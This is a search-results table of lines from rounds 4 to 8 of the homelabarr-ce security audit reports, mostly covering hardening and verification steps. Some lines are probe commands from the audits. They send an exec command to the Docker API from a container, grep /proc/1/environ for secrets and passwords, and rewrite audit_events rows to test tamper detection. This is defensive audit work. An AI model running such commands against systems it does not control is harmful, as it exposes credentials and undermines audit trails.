| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `If the CLI cannot tolerate '/homelabarr' being read-only, list the specific subdirectories that require writes and mount` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `M-R4-9  Pin all images in homelabarr.yml by tag@sha256:digest.` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `Provide a release script that bumps the digest pins in 'homelabarr.yml' whenever a new tagged release is published, and ` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `When R4 ships, I will re-verify against 'ce-demo.homelabarr.com' with cache-busting:` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `docker compose -f homelabarr.yml up -d backend 2>&1 \| head -5` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 2 x | `docker exec homelabarr-backend ls -la /var/run/docker.sock 2>&1` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `docker exec homelabarr-backend sh -c 'awk "/^CapEff/ {print \$2}" /proc/self/status'` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `docker exec homelabarr-backend sh -c 'cat /proc/self/status \| grep CapEff'` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `docker exec homelabarr-backend sh -c 'touch /etc/marker 2>&1; echo rc=$?'` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `docker exec homelabarr-backend sh -c 'touch /etc/marker; echo rc=$?' 2>&1` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `docker exec homelabarr-backend wget -qO- -S --post-data='{"Cmd":["id"]}' \` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 3 x | `docker exec homelabarr-backend wget -qO- -S \` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 2 x | `docker exec homelabarr-backend wget -qO- \` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 2 x | `docker exec homelabarr-frontend id` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `docker exec homelabarr-frontend sh -c 'touch /etc/marker 2>&1; echo rc=$?'` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `docker exec homelabarr-frontend sh -c 'touch /etc/marker; echo rc=$?' 2>&1` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `docker inspect homelabarr-backend --format '{{ .HostConfig.ReadonlyRootfs }} {{ .HostConfig.SecurityOpt }} {{ .HostConfi` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `docker inspect homelabarr-backend --format '{{ .HostConfig.ReadonlyRootfs }} \| {{ .HostConfig.SecurityOpt }} \| {{ .Hos` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `docker inspect homelabarr-backend --format '{{ range .Mounts }}{{ .Source }} -> {{ .Destination }} ({{ .Mode }}){{ "\n" ` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `grep -E 'image:.*@sha256:' homelabarr.yml \| wc -l` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `image: ghcr.io/imogenlabs/homelabarr-frontend:latest` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `image: ghcr.io/imogenlabs/homelabarr-frontend:v1.2.3@sha256:<64hex>` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `\| Cosign keyless signature \| **NO** \| No 'cosign sign' step; consumers cannot 'cosign verify --certificate-identity=.` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 1 x | `\| '/homelabarr' bind mount RW \| YES (':rw') \| Backend can also rewrite the CLI it executes \|` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `            --excludePackages 'homelabarr@2.2.0' \` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `          for img in homelabarr-frontend homelabarr-backend; do` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `          image-ref: ghcr.io/${{ github.repository_owner }}/homelabarr-backend@${{ steps.build.outputs.digest }}` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `          image: ghcr.io/${{ github.repository_owner }}/homelabarr-backend@${{ steps.build.outputs.digest }}` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `      --certificate-identity-regexp '^https://github.com/imogenlabs/homelabarr-ce/' \\` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `      ghcr.io/imogenlabs/homelabarr-backend:<tag>` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `      ghcr.io/imogenlabs/homelabarr-backend:<tag> --format '{{ json .SBOM.SPDX }}' \\` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `    homelabarr.yml` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `   - **Manual review:** every dependency bump (any range) and any change touching 'server/auth.js', 'server/index.js', o` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 2 x | `  "name": "homelabarr",` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `  # docker buildx imagetools inspect ghcr.io/imogenlabs/homelabarr-frontend:v2.2.0 --format '{{json .Manifest.Digest}}'` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `  # in-place rewrite of homelabarr.yml` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 2 x | `  --certificate-identity-regexp '^https://github.com/imogenlabs/homelabarr-ce/' \` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `  R4.5-drift-1  DEFAULT_ADMIN_PASSWORD=${VAR:?...} fail-loud in homelabarr.yml.` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `  ghcr.io/imogenlabs/homelabarr-backend:$LATEST` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `  ghcr.io/imogenlabs/homelabarr-backend@sha256:<digest-from-latest-build>` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `  image: ghcr.io/imogenlabs/homelabarr-backend:latest` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `  image: ghcr.io/imogenlabs/homelabarr-backend:v2.2.0@sha256:<64hex>` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `  image: ghcr.io/imogenlabs/homelabarr-frontend:latest` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `  image: ghcr.io/imogenlabs/homelabarr-frontend:v2.2.0@sha256:<64hex>` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `### 4.3 — Image digest pin honored in 'homelabarr.yml'` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `### Round 4 verification matrix (against 'homelabarr.yml' @ 'security/round-4-container-hardening' + live probes)` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `**R4.5-drift-1** — 'homelabarr.yml' still has '- DEFAULT_ADMIN_PASSWORD=${DEFAULT_ADMIN_PASSWORD:-admin}'. Should be '` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `**R4.5-drift-2** — Images in 'homelabarr.yml' still reference ':latest' for the HomelabARR-published frontend and back` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `**Target:** 'smashingtags/homelabarr-ce' @ 'security/round-4-container-hardening@15812e2b' (live: ce-demo.homelabarr.com` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `**Where:** 'homelabarr.yml' lines 'image: ghcr.io/imogenlabs/homelabarr-frontend:latest' and 'image: ghcr.io/imogenlabs/` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `- 'homelabarr.yml' shows 2 'tag@sha256:digest' pins, zero ':latest' for HomelabARR-published images.` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `5. **Run the 'bump-image-digests.sh' script as part of the release ritual** and commit the resulting 'homelabarr.yml' di` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `H-R5-3   Pin both HomelabARR-published images in homelabarr.yml by` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `LATEST=$(gh api repos/smashingtags/homelabarr-ce/packages/container/homelabarr-backend/versions \` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `[![OpenSSF Scorecard](https://api.securityscorecards.dev/projects/github.com/imogenlabs/homelabarr-ce/badge)](https://se` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `curl -fsS 'https://api.securityscorecards.dev/projects/github.com/imogenlabs/homelabarr-ce' \| jq '.score'` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `curl -fsS 'https://api.securityscorecards.dev/projects/github.com/imogenlabs/homelabarr-ce' \| jq '{score, checks:[.chec` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `curl -fsS https://ce-demo.homelabarr.com/api/health \| jq '.status, .environment.validation.warnings'` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `echo "    ghcr.io/imogenlabs/homelabarr-backend:$TAG"` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `echo "  cosign verify --certificate-identity-regexp '^https://github.com/imogenlabs/homelabarr-ce/' \\"` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `for img in homelabarr-frontend homelabarr-backend; do` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `gh api repos/smashingtags/homelabarr-ce/code-scanning/alerts?tool_name=trivy-image-backend \| jq 'length'` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `grep -E 'DEFAULT_ADMIN_PASSWORD=\$\{DEFAULT_ADMIN_PASSWORD:\?' homelabarr.yml` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `grep -E 'ghcr.io/imogenlabs/homelabarr-(frontend\|backend):[^@]+@sha256:' homelabarr.yml \| wc -l` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `grep -E 'image:.*homelabarr-(frontend\|backend):latest($\|[[:space:]])' homelabarr.yml \| wc -l` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `grep -cE 'ghcr.io/imogenlabs/homelabarr-(frontend\|backend):[^@]+@sha256:[a-f0-9]{64}' homelabarr.yml` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `grep -cE 'image:.*homelabarr-(frontend\|backend):latest($\|[[:space:]])' homelabarr.yml` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `id = "homelabarr-admin-password"` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `id = "homelabarr-jwt-secret"` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `name: homelabarr            version: 2.2.0            type: module` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `rm -f homelabarr.yml.bak` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `title = "homelabarr-ce gitleaks config"` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1 x | `\| **R9** \| Application-layer DAST — automated OWASP ZAP baseline run against ce-demo.homelabarr.com on every merge t` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 2 x | `    https://ce-demo.homelabarr.com/api/auth/login` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `   sqlite3 /app/data/homelabarr.db "DELETE FROM sessions; DELETE FROM rate_buckets;"` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 2 x | `  --data '{"username":"admin","passcode":"WRONG"}' https://ce-demo.homelabarr.com/api/auth/login` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `  R5.5-drift-6  Image digest pinning in homelabarr.yml (requires` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `  const body = JSON.stringify({ ...payload, source: 'homelabarr-ce' });` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `  defaultMeta: { service: 'homelabarr-backend', version: process.env.APP_VERSION \|\| 'dev' },` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `  https://ce-demo.homelabarr.com/api/audit \| jq '.chain'` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `  https://ce-demo.homelabarr.com/api/audit?limit=10 \| jq '{chain, last:.events[0]}'` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `  https://ce-demo.homelabarr.com/api/audit?limit=5 \| jq '.events[0] \| {event, result, ip}'` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 2 x | `  https://ce-demo.homelabarr.com/api/auth/login` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `  https://ce-demo.homelabarr.com/api/health/detail \| jq '.platform.nodeVersion'` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `# homelabarr.yml — image lines (replace BOTH services)` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `# homelabarr.yml — line: DEFAULT_ADMIN_PASSWORD` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `**Target:** 'smashingtags/homelabarr-ce' @ 'security/round-5-supply-chain@34bd4138' (live: ce-demo.homelabarr.com, bundl` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `- Every API response carries 'X-Request-Id'; 'docker logs homelabarr-backend' lines are valid JSON containing the same r` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `- 'grep -cE 'homelabarr-(frontend\|backend):[^@]+@sha256:[a-f0-9]{64}' homelabarr.yml' returns 2.` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 2 x | `curl -s https://ce-demo.homelabarr.com/api/health \| jq 'keys'` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `curl -s https://ce-demo.homelabarr.com/api/health \| jq -r .status                    # expect OK` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `curl -sI -H "X-Request-Id: $RID" https://ce-demo.homelabarr.com/api/health \| grep -i x-request-id` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `curl -sI https://ce-demo.homelabarr.com/api/health \| tr -d '\r' \| grep -i '^x-request-id:'` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `docker logs --tail 100 homelabarr-backend 2>&1 \| grep -iE 'passcode\|password\|jwt_secret' \| grep -v 'REDACTED' \| hea` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `docker logs --tail 200 homelabarr-backend 2>&1 \| jq -c "select(.rid==\"$RID\")"` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `docker logs --tail 5 homelabarr-backend 2>&1 \| head -1 \| jq -r .level` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `grep -c 'DEFAULT_ADMIN_PASSWORD=\$\{DEFAULT_ADMIN_PASSWORD:\?' homelabarr.yml   # expect 1` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `grep -cE 'homelabarr-(frontend\|backend):[^@]+@sha256:[a-f0-9]{64}' homelabarr.yml  # expect 2` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `image: ghcr.io/imogenlabs/homelabarr-backend:latest` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `image: ghcr.io/imogenlabs/homelabarr-backend:v2.2.0@sha256:<64hex>` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `image: ghcr.io/imogenlabs/homelabarr-frontend:latest` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `image: ghcr.io/imogenlabs/homelabarr-frontend:v2.2.0@sha256:<64hex>` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `sqlite3 /app/data/homelabarr.db "UPDATE audit_events SET result='ok' WHERE id=(SELECT MIN(id) FROM audit_events);"` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `sqlite3 /app/data/homelabarr.db "UPDATE audit_events SET result='ok' WHERE id=1;"` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1 x | `\| **R9** \| Application-layer DAST — automated OWASP ZAP baseline against ce-demo.homelabarr.com on each main-branch ` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `         pulls any cleartext credential JSON from homelabarr-config volume` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `  'sqlite3 /app/data/homelabarr.db "SELECT 1;"' 2>&1 \| head -5` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `  db.backup('/tmp/homelabarr.$STAMP.db').then(() => process.exit(0));` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 2 x | `  https://ce-demo.homelabarr.com/api/audit \| jq '.chain.ok'` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `  https://ce-demo.homelabarr.com/api/audit/note \|\| true` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `  https://ce-demo.homelabarr.com/api/auth/login` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `  https://ce-demo.homelabarr.com/api/auth/me \| jq -r '.username'` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 2 x | `  https://ce-demo.homelabarr.com/api/auth/sessions \| jq 'length'` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `### C-R7-2 — 'homelabarr.db' SQLite database is cleartext on disk` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `**Compose changes — 'homelabarr.yml':**` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `**Target:** 'smashingtags/homelabarr-ce' @ 'security/round-6-observability@5807987e' (live: ce-demo.homelabarr.com)` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `**Where:** '/app/data/homelabarr.db' inside the backend, persisted via the 'homelabarr-data' Docker volume (host path un` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `**Where:** 'homelabarr-config' volume mounted at '/app/server/config' (per R4 §2.1). If that path contains any JSON fil` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `**Where:** 'homelabarr.yml' backend service 'environment:' block; 'server/auth.js' reading 'process.env.JWT_SECRET'; 'se` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `- 'docker exec homelabarr-backend ls /run/secrets' shows 4–5 mode-0400 files.` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `- 'head -c 16 /app/data/homelabarr.db' returns random bytes, not "SQLite format 3".` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `- 'homelabarr.yml' shows two 'tag@sha256:digest' pins (R5.5-drift-6 cleaned).` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `7. **Decide 'AUDIT_STRICT'** for production. Recommendation: 'AUDIT_STRICT=1' so any tampering with 'homelabarr.db' trig` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `AFTER=$(docker exec homelabarr-backend node -e "console.log(require('./server/db.js').db.prepare('SELECT count(*) c FROM` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `BEFORE=$(docker exec homelabarr-backend node -e "console.log(require('./server/db.js').db.prepare('SELECT count(*) c FRO` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `DB_PATH="${1:?usage: $0 <path/to/homelabarr.db>}"` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `DB_PATH="${DB_PATH:-/var/lib/docker/volumes/homelabarr-data/_data/homelabarr.db}"` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `Until the kv_secrets migration in R7 H-R7-6 is complete, the homelabarr-config` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `'homelabarr.yml' backend service environment block lists at minimum:` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `const DB_PATH = process.env.DB_PATH \|\| '/app/data/homelabarr.db';` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 2 x | `curl -s -o /dev/null -w '%{http_code}\n' https://ce-demo.homelabarr.com/api/health` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `curl -s -o /dev/null -w '%{http_code}\n' https://ce-demo.homelabarr.com/api/health/detail` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `curl -s https://ce-demo.homelabarr.com/api/health \| jq 'keys'` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `docker cp "homelabarr-backend:/tmp/homelabarr.$STAMP.db" "$BACKUP_DIR/"` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 2 x | `docker exec homelabarr-backend ls -la /run/secrets/` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `docker exec homelabarr-backend ls -la /run/secrets/sqlcipher_key` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `docker exec homelabarr-backend node -e "` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `docker exec homelabarr-backend node -e "..." # same query, same N` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `docker exec homelabarr-backend node -e "const db=require('./server/db.js').db; console.log(db.prepare('SELECT count(*) c` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `docker exec homelabarr-backend rm -f "/tmp/homelabarr.$STAMP.db"` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 2 x | `docker exec homelabarr-backend sh -c 'head -c 16 /app/data/homelabarr.db \| xxd'` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `docker exec homelabarr-backend sh -c 'sqlite3 /app/data/homelabarr.db "SELECT 1;"' 2>&1` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `docker exec homelabarr-backend sh -c 'tr "\0" "\n" < /proc/1/environ \| grep -iE "jwt\|secret\|password"'` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `docker exec homelabarr-backend sh -c 'tr "\0" "\n" < /proc/1/environ \| grep -iE "secret\|password\|key"'` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `docker exec homelabarr-backend sh -c \` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `docker inspect homelabarr-backend --format '{{ range .Config.Env }}{{ println . }}{{ end }}'` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 2 x | `docker inspect homelabarr-backend --format '{{ range .Config.Env }}{{ println . }}{{ end }}' \` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `echo "wrote $BACKUP_DIR/homelabarr.$STAMP.db and $BACKUP_DIR/secrets.$STAMP.tar.zst"` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `export const db = new Database('/app/data/homelabarr.db');` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `grep -E 'DEFAULT_ADMIN_PASSWORD=\$\{DEFAULT_ADMIN_PASSWORD:\?' homelabarr.yml \| wc -l` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `grep -cE 'ghcr.io/imogenlabs/homelabarr-(frontend\|backend):[^@]+@sha256:[a-f0-9]{64}' homelabarr.yml` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `\| **R9** \| Application-layer DAST — automated OWASP ZAP baseline run against ce-demo.homelabarr.com on each merge to` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `\| SQLCipher key (new) \| Encrypts 'homelabarr.db' at rest \| 180 days \|` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `\| 'homelabarr-activity' \| '/app/server/activity-data' — rotated 'audit-*.jsonl.gz' (R6 M-R6-6) \| HIGH — login IPs` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `\| 'homelabarr-config' \| '/app/server/config' — users.json (R0 legacy?), api keys, session state \| HIGH \|` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 1 x | `\| 'homelabarr-data' \| SQLite DB '/app/data/homelabarr.db' (users, sessions, account_lockouts, rate_buckets, audit_even` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `          /var/lib/docker/volumes/homelabarr-activity/_data/audit.jsonl` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `         container; homelabarr.yml gains apparmor=homelabarr-backend in` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `      - homelabarr-activity:/audit:ro                        # the JSONL mirror from R6` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `      - homelabarr-internal` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `      --certificate-identity-regexp '^https://github.com/imogenlabs/homelabarr-ce/' \` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `      ghcr.io/imogenlabs/homelabarr-backend:v2.3.0` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `      rm -f /data/homelabarr.db` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `    # Restore the encrypted DB into the homelabarr-data volume` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `    - apparmor=homelabarr-backend         # new` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `    cd /opt && git clone https://github.com/imogenlabs/homelabarr-ce && cd homelabarr-ce` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `    docker cp <path-to-homelabarr.STAMP.db> homelabarr-backend:/app/data/homelabarr.db` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `    docker run --rm -v homelabarr-data:/data alpine sh -c '` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `    https://ce-demo.homelabarr.com/api/auth/login` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `   'cosign verify --certificate-identity-regexp ... ghcr.io/imogenlabs/homelabarr-backend:v2.3.0'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `   from 'homelabarr.yml')` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `  http://localhost/containers/homelabarr-backend/exec -d '{"AttachStdout":true,"Cmd":["node","-e","import(\'./server/aud` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `  https://ce-demo.homelabarr.com/api/audit?limit=50 \` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `  rsync -av --remove-source-files "./backups/homelabarr.$STAMP.db" "$BACKUP_REMOTE/"` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `# Expect: 'Jail: homelabarr' followed by a Banned IP list (empty initially)` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 2 x | `# Expect: 'homelabarr-backend (enforce)'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `# Expect: contains 'apparmor=homelabarr-backend'` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `# R5.5-drift-6 — homelabarr.yml after tagging v2.3.0 and running scripts/bump-image-digests.sh v2.3.0` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `**RIGHT — '/etc/fail2ban/filter.d/homelabarr.conf'** (parses the JSONL audit log)` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `**Target:** 'smashingtags/homelabarr-ce' @ 'security/round-7-secrets@9e3e1a52' (live: ce-demo.homelabarr.com)` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `**What:** Current live response: 'strict-transport-security: max-age=15552000; includeSubDomains'. Add 'preload', then s` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `**Where:** 'homelabarr.yml' backend service 'security_opt:' block — currently has 'no-new-privileges' and 'seccomp=def` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `**'/etc/cron.d/homelabarr-backup'** (installed by the runbook)` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `**'homelabarr.yml' change** (backend service):` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `- Limits testing to ce-demo.homelabarr.com (or your own self-hosted copy).` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `- 'aa-status' shows 'homelabarr-backend (enforce)'.` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `- 'fail2ban-client status homelabarr' shows the jail loaded.` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `1. **Run 'scripts/host-firewall-setup.sh' on the ce-demo.homelabarr.com host.** This is irreversible without console acc` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `10. fail2ban:  copy 'docs/fail2ban/homelabarr.conf' to '/etc/fail2ban/jail.d/', restart fail2ban.` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `11. Backups:  install '/etc/cron.d/homelabarr-backup'; verify after 24 hours.` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `17 3 * * *  root  /opt/homelabarr/scripts/backup-cron.sh    >> /var/log/homelabarr-backup.log 2>&1` |
| `docs/audit/homelabarr-ce-security-audit-round-8.md` | 1 x | `17 4 1 * *  root  /opt/homelabarr/scripts/restore-drill.sh  >> /var/log/homelabarr-restore-drill.log 2>&1` |
